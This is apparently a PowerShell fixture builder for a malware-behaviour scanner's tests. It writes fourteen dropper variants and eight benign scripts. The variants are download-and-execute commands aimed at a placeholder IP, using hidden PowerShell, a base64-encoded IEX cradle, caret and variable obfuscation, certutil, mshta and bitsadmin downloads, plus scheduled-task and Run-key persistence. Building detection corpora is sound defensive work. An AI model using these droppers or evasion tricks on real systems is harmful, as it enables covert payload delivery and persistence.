<#
    Builds the behaviour test corpus (Windows mirror of corpus.sh).

    Two sets, and BOTH matter:

      evasion\  Variants of the dropper an attacker could realistically ship
                tomorrow. Every one MUST be detected. They exist because the
                first version of the deep scan missed three of them.

      benign\   Ordinary scripts a real person might have in their Documents.
                NONE may be flagged. A behaviour scanner that cries wolf is
                worse than none, because the audience cannot tell a false
                alarm from a real one.

    Keep this in step with corpus.sh. Both suites assert the same expected
    count, so adding a case to one and not the other fails the other's build.

    Everything written here is inert. Payload-ish strings are assembled from
    fragments at runtime so no file in the repo carries a working command line.
#>

function Build-Corpus {
    param([Parameter(Mandatory)][string]$Root)

    $ev = Join-Path $Root 'evasion'
    $bn = Join-Path $Root 'benign'
    if (Test-Path -LiteralPath $Root) { Remove-Item -LiteralPath $Root -Recurse -Force }
    New-Item -ItemType Directory -Path $ev -Force | Out-Null
    New-Item -ItemType Directory -Path $bn -Force | Out-Null
    New-Item -ItemType Directory -Path (Join-Path $ev 'sub\nested') -Force | Out-Null

    # Fragments -- never a complete live string in the repo itself.
    $IP = '198.51' + '.100.77'          # RFC 5737 documentation range
    $PS = 'power'  + 'shell'
    $H  = 'hid'    + 'den'

    # ------------------------------------------------------------- evasion

    # 1. The original chain, as published.
    Set-Content "$ev\01-original.bat" -Value @(
        '@echo off',
        'if not defined _Q set _Q=1 & start /min cmd /c %~f0 & exit',
        "$PS -w $H -ep bypass -c iwr http://$IP/x/p.bat -OutFile %TEMP%\p.bat")

    # 2. Parameter abbreviation + Invoke-RestMethod. PowerShell accepts any
    #    unambiguous prefix, so "-exec" is as valid as "-executionpolicy".
    #    The first version of the scanner scored this ZERO.
    Set-Content "$ev\02-abbrev-irm.bat" -Value @(
        '@echo off', "$PS -exec bypass -c `"irm http://$IP/p.ps1 | iex`"")

    # 3. .NET WebClient instead of a cmdlet, with irregular spacing.
    Set-Content "$ev\03-webclient.bat" -Value @(
        '@echo off',
        "$PS -WindowStyle  $H -Command `"(New-Object Net.WebClient).DownloadFile('http://$IP/a',`$env:TEMP+'\a.exe')`"")

    # 4. Fully base64-encoded command. Nothing incriminating is visible as
    #    plain text -- this only fails if the scanner decodes the payload.
    $inner = "IEX(New-Object Net.WebClient).DownloadString('http://$IP/s')"
    $b64   = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($inner))
    Set-Content "$ev\04-base64.bat" -Value @('@echo off', "$PS -nop -w $H -enc $b64")

    # 5. Batch caret obfuscation, splitting the command name itself.
    Set-Content "$ev\05-caret.bat" -Value @(
        '@echo off', "p^o^w^e^r^s^h^e^l^l -w $H -c iwr http://$IP/x")

    # 6. PowerShell string-splitting so no literal cmdlet name appears.
    Set-Content "$ev\06-concat.ps1" -Value @(
        "$PS -c `"& ('i'+'w'+'r') http://$IP/x -OutFile `$env:TEMP\q`"")

    # 7. certutil as the downloader -- no PowerShell involved at all.
    Set-Content "$ev\07-certutil.bat" -Value @(
        '@echo off',
        "certutil.exe -urlcache -split -f http://$IP/p.exe %TEMP%\p.exe",
        'start /min %TEMP%\p.exe')

    # 8. mshta, which the first version did not know about at all.
    Set-Content "$ev\08-mshta.bat" -Value @('@echo off', "mshta http://$IP/a.hta")

    # 9. bitsadmin transfer then run.
    Set-Content "$ev\09-bitsadmin.bat" -Value @(
        '@echo off',
        "bitsadmin /transfer j http://$IP/a %TEMP%\a.exe",
        'start /b %TEMP%\a.exe')

    # 10. VBScript dropper using a hidden WScript.Shell run.
    Set-Content "$ev\10-vbs.vbs" -Value @(
        'Set h = CreateObject("MSXML2.XMLHTTP")',
        "h.open ""GET"", ""http://$IP/p"", False",
        'Set s = CreateObject("WScript.Shell")',
        's.Run "cmd /c " & t, 0, False')

    # 11. Persistence rather than download: schedule itself to run again.
    Set-Content "$ev\11-schtasks.bat" -Value @(
        '@echo off',
        'schtasks /create /tn Updater /tr "%TEMP%\a.bat" /sc onlogon',
        "$PS -w $H -c iwr http://$IP/a")

    # 12. Registry Run key persistence.
    Set-Content "$ev\12-runkey.bat" -Value @(
        '@echo off',
        'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Up /d "%TEMP%\a.bat"',
        "certutil -f http://$IP/a %TEMP%\a.bat")

    # 13. Variable-indirection obfuscation, a classic batch trick.
    Set-Content "$ev\13-varsplit.bat" -Value @(
        '@echo off', 'set a=powers', 'set b=hell',
        "%a%%b%% -w $H -c iwr http://$IP/x")

    # 14. Dropped into a SUBFOLDER of Documents, not the top level.
    Set-Content "$ev\sub\nested\15-subfolder.bat" -Value @(
        '@echo off',
        "$PS -w $H -ep bypass -c iwr http://$IP/x -OutFile %TEMP%\x")

    # -------------------------------------------------------------- benign

    Set-Content "$bn\launch-game.bat" -Value @(
        '@echo off', 'REM Launch the game with more memory',
        'start "" "C:\Games\game.exe" -highmemory')

    Set-Content "$bn\backup-saves.bat" -Value @(
        '@echo off', 'xcopy /s /y "D:\saves" "E:\backup\saves"', 'echo Backup done', 'pause')

    # Uses a temp folder and cmd /c, but does nothing else suspicious.
    Set-Content "$bn\list-temp.bat" -Value @(
        '@echo off', 'cmd /c dir %TEMP% > %TEMP%\listing.txt', 'notepad %TEMP%\listing.txt')

    # Downloads, but over TLS from a named host, and hides nothing.
    Set-Content "$bn\fetch-json.bat" -Value @(
        'curl.exe https://example.com/api/data.json -o "%TEMP%\data.json"')

    Set-Content "$bn\find-big-files.ps1" -Value @(
        'Get-ChildItem -Recurse |',
        '  Where-Object Length -gt 1GB |',
        '  Sort-Object Length -Descending |',
        '  Select-Object -First 20 FullName, Length')

    Set-Content "$bn\open-in-notepad.ps1" -Value @(
        'param([string]$Path)', 'Start-Process notepad.exe -ArgumentList $Path')

    # A modding helper: copies files, mentions paks, still not a dropper.
    Set-Content "$bn\install-mod.bat" -Value @(
        '@echo off', 'REM Install a map you downloaded manually',
        'copy /y "%~dp0*.pak" "D:\SteamLibrary\steamapps\common\Game\Content\Paks\~mods\"',
        'echo Installed.', 'pause')

    # Mentions PowerShell and a URL in a comment only.
    Set-Content "$bn\readme-helper.bat" -Value @(
        '@echo off',
        'REM See https://example.com/help for how to use powershell here',
        'echo Nothing to do.')
}
